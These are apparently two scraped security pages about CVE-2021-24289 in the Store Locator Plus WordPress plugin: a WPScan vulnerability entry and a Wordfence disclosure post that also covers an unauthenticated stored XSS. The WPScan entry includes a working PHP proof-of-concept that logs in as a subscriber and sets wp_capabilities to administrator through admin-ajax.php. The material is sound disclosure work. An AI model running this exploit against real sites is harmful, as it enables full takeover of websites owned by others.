=== Content from wpscan.com_d1369923_20250114_195946.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# Store Locator Plus < 5.9 - Authenticated Privilege Escalation

### Description

There is functionality in the plugin that made it possible for authenticated users to update their user meta data to become an administrator on any site using the plugin.

\*\*Partially unpatched because they added CSRF protection that technically blocks low-level users from using the endpoint, however, no capability check was added.

### Proof of Concept

<?php
// Settings
$wp\_url = $argv[1];
$wp\_user = $argv[2];
$wp\_pass = $argv[3];
// Log in as subscriber
$ch = curl\_init();
$cookiejar = tempnam(sys\_get\_temp\_dir(), 'cookiejar-');
curl\_setopt($ch, CURLOPT\_URL, $wp\_url . '/wp-login.php');
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, true);
curl\_setopt($ch, CURLOPT\_POST, true);
curl\_setopt($ch, CURLOPT\_POSTFIELDS, [
'log' => $wp\_user,
'pwd' => $wp\_pass,
'rememberme' => 'forever',
'wp-submit' => 'Log+In',
]);
$output = curl\_exec($ch);
curl\_close($ch);
// Escalate
$ch = curl\_init();
curl\_setopt($ch, CURLOPT\_URL, $wp\_url . '/wp-admin/admin-ajax.php');
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, true);
curl\_setopt($ch, CURLOPT\_POST, true);
curl\_setopt($ch, CURLOPT\_POSTFIELDS, [
'action' => 'slp\_change\_option',
'formdata[option\_name]' => 'user\_meta[wp\_capabilities]',
'formdata[option\_value][administrator]' => '1'
]);
$content = curl\_exec($ch);
echo $content;
?>

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

store-locator-le](https://a8cteam5105.wordpress.com/plugin/store-locator-le/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 5.9

### References

CVE
[CVE-2021-24289](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24289)

URL
<https://www.wordfence.com/blog/2021/04/severe-unpatched-vulnerabilities-leads-to-closure-of-store-locator-plus-plugin/>

### Classification

Type
PRIVESC

OWASP top 10
[A2: Broken Authentication and Session Management](https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication)

CWE
[CWE-269](https://cwe.mitre.org/data/definitions/269.html)

CVSS
[9.9 (critical)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

### Miscellaneous

Original Researcher
Chloe Chamberland

Submitter
Chloe Chamberland

Submitter website
<https://wordfence.com>

Submitter twitter
[infosecchloe](//twitter.com/infosecchloe)

Verified
Yes

WPVDB ID
[078e93cd-7cf2-4e23-8171-58d44e354d62](https://a8cteam5105.wordpress.com/vulnerability/078e93cd-7cf2-4e23-8171-58d44e354d62/)

### Timeline

Publicly Published
2021-04-26 (about 3 years ago)

Added
2021-04-27 (about 3 years ago)

Last Updated
2022-09-06 (about 2 years ago)

### Other

Published
Title

Published
2020-11-09
Title
[Ultimate Member < 2.1.12 - Authenticated Privilege Escalation via Profile Update](https://a8cteam5105.wordpress.com/vulnerability/dd4c4ece-7206-4788-8747-f0c0f3ab0a53/)

Published
2022-10-10
Title
[Automatic User Roles Switcher < 1.1.2 - Subscriber+ Privilege Escalation](https://a8cteam5105.wordpress.com/vulnerability/5909a423-9841-449c-a569-f687c609817b/)

Published
2020-06-10
Title
[Brizy - Page Builder < 1.0.126 - Improper Access Controls on AJAX Calls](https://a8cteam5105.wordpress.com/vulnerability/03b9c219-6cbc-4735-8bea-041a27212c31/)

Published
2023-03-06
Title
[Multiple e-plugins - Subscriber+ Privilege Escalation](https://a8cteam5105.wordpress.com/vulnerability/d079cb16-ead5-4bc8-b0b8-4a4dc2a54c96/)

Published
2024-12-11
Title
[Wp NssUser Register <= 1.0.0 - Unauthenticated Privilege Escalation](https://a8cteam5105.wordpress.com/vulnerability/ce4061d0-fc57-4b2d-95f7-f35f04260c94/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)


=== Content from www.wordfence.com_f41e0f9c_20250114_195946.html ===


![](https://www.wordfence.com/wp-content/uploads/2021/04/Severe-Unpatched-Vulnerabilities-Leads-to-Closure-of-Store-Locator-Plus-Plugin-.png)

[![](https://secure.gravatar.com/avatar/9bf72594e071c28445ed7a1be0de1a23?s=80&d=mm&r=g)Chloe Chamberland](https://www.wordfence.com/blog/author/wfchloe/)

April 26, 2021

# Severe Unpatched Vulnerabilities Leads to Closure of Store Locator Plus Plugin

On March 5, 2021, the Wordfence Threat Intelligence team wrapped up an investigation that led to the discovery of a privilege escalation vulnerability along with several additional vulnerabilities in [Store Locator Plus](https://wordpress.org/plugins/store-locator-le/), a WordPress plugin installed on over 9,000 sites.

We initially reached out to the plugin’s developer on March 5, 2021. We received no response for a week before we attempted to make contact again. After receiving no response for 20 days, and after two contact attempts, we escalated the issue to the WordPress Plugins team on March 25, 2021, providing the full details of the vulnerability at the time of reporting.

The WordPress Plugins team responded to us the same day informing us that they would notify the plugin’s developer of our findings. The developer released a patch on April 5, 2021, but the patch was insufficient, leading to the closure of the plugin on April 12, 2021.

[Wordfence Premium](https://www.wordfence.com/wordfence-signup/?promo_id=blog20210426&promo_name=get-premium&promo_creative=txt&promo_position=conclusion) users received firewall rules protecting against these vulnerabilities on March 5, 2021, while those still using the free version of Wordfence received the same protection on April 4, 2021. Regardless, **we strongly recommend deactivating and removing this plugin immediately and finding a replacement.** We do not know at this point if the plugin will be patched.

**Description:** Authenticated Privilege Escalation

**Affected Plugin:** Store Locator Plus

**Plugin Slug:** store-locator-le

**Affected Versions:** <= 5.5.14

**CVE ID:** [CVE-2021-24289](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24289)

**CVSS Score:** 9.9 (Critical)

**CVSS Vector:** [CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**Fully Patched Version:** Partially patched in version 5.5.15.

Store Locator Plus is a plugin designed to add a store locator to a WordPress site and makes it very simple to do so. Unfortunately, there was functionality in the plugin that made it possible for authenticated users to update their user meta data to become an administrator on any site using the plugin. This could allow attackers to gain administrative access to a site and completely take it over.

This vulnerability was partially patched in version 5.5.15. However, our analysis indicates that it is not sufficient and, therefore, should be treated as an unpatched vulnerability.

**Description:** Unauthenticated Stored Cross-Site Scripting

**Affected Plugin:** Store Locator Plus

**Plugin Slug:** store-locator-le

**Affected Versions:** <= 5.5.15

**CVE ID:** [CVE-2021-24290](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24290)

**CVSS Score:** 7.2 (High)

**CVSS Vector:** [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N)

**Fully Patched Version:** CURRENTLY UNPATCHED.

In addition to the privilege escalation vulnerability, we found several endpoints in the plugin that could allow unauthenticated attackers the ability to inject malicious JavaScript into pages. These could be used by an attacker to inject backdoors or add new administrative user accounts, ultimately leading to complete site compromise.

## How can I protect my site?

We strongly recommend deactivating and removing the Store Locator Plus plugin and finding a replacement, as this plugin may not be patched in the foreseeable future. If you must keep the plugin installed on your site until you find a replacement, and you are running the Wordfence Web Application Firewall, then you can rest assured that your site will be protected against any exploits targeting this vulnerability while searching for a replacement store locator solution.

*We are intentionally providing minimal details about these vulnerabilities to provide users ample time to find an alternative solution. We may provide additional details later as we continue to monitor the situation.*

Search

### Trust Your Site to the Leader in WordPress Security

Wordfence includes an endpoint firewall, malware scanner, robust login security features, live traffic views, and more. Discover why over 5 million WordPress sites put their trust in Wordfence.

[Protect Your Site](/products/pricing/)

**Did you enjoy this post? Share it!**

[*Facebook*](http://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2021%2F04%2Fsevere-unpatched-vulnerabilities-leads-to-closure-of-store-locator-plus-plugin%2F)
[*Twitter*](https://twitter.com/share?url=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2021%2F04%2Fsevere-unpatched-vulnerabilities-leads-to-closure-of-store-locator-plus-plugin%2F&text=Severe%20Unpatched%20Vulnerabilities%20Leads%20to%20Closure%20of%20Store%20Locator%20Plus%20Plugin&via=wordfence)
[*LinkedIn*](https://www.linkedin.com/shareArticle?url=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2021%2F04%2Fsevere-unpatched-vulnerabilities-leads-to-closure-of-store-locator-plus-plugin%2F)

## Comments

2 Comments

* ![](https://secure.gravatar.com/avatar/f67a32192c7866e26de8498855452a54?s=96&d=mm&r=g)
  Daniel
  May 3, 2021
   2:20 pm

  Any new regarding a patch or update for Store Locator Plus? Nobody is saying anything. Please let us know.

+ ![](https://secure.gravatar.com/avatar/9bf72594e071c28445ed7a1be0de1a23?s=96&d=mm&r=g)
  Chloe Chamberland
  May 12, 2021
   12:14 pm

  Hi Daniel,

  Unfortunately, as of right now there is no available patch that we are aware of. I recommend looking into possible alternatives and you can rest assured knowing that Wordfence is keeping your site protected in the meantime.

### Breaking WordPress Security Research in your inbox as it happens.

![Example of a news story](/img/footer-news-example.jpg)

This site uses cookies in accordance with our [Privacy Policy](/privacy-policy).

Cookie Settings
Accept All

## Cookie Options

For additional information on how this site uses cookies, please review our [Privacy Policy](/privacy-policy). The cookies used by this site are classified into the following categories and can be configured below.

### Strictly Necessary

These Cookies are necessary for the Sites and Services to work properly. They include any essential authentication and authorization cookies for the Services.

\* Cookies of this category are necessary for the site to function and cannot be disabled.

### Performance/Analytical

These Cookies allow us to collect certain information about how you navigate the Sites or utilize the Services running on your device. They help us understand which areas you use and what we can do to improve them.

### Targeting

These Cookies are used to deliver relevant information related to the Services to an identified machine or other device (not a named or otherwise identifiable person) which has previously been used to visit our Sites. Some of these types of Cookies on our Sites are operated by third parties with our permission and are used to identify advertising sources that are effectively driving customers to our Sites.

Cancel
Save


